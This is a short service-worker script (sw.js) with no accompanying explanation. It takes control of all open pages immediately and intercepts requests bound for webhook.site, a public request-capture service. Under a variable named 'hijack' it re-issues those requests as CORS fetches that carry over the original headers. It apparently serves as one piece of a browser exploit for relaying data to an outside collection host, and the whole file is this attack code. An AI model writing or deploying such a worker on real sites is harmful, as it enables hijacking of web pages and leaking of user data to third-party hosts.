// sw.js
self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', e => {
  if (e.request.url.includes('webhook.site')) {
    const hijack = new Request(e.request.url, {
      mode: 'cors',
      credentials: 'omit',
      headers: e.request.headers
    });
    return e.respondWith(fetch(hijack));
  }
});
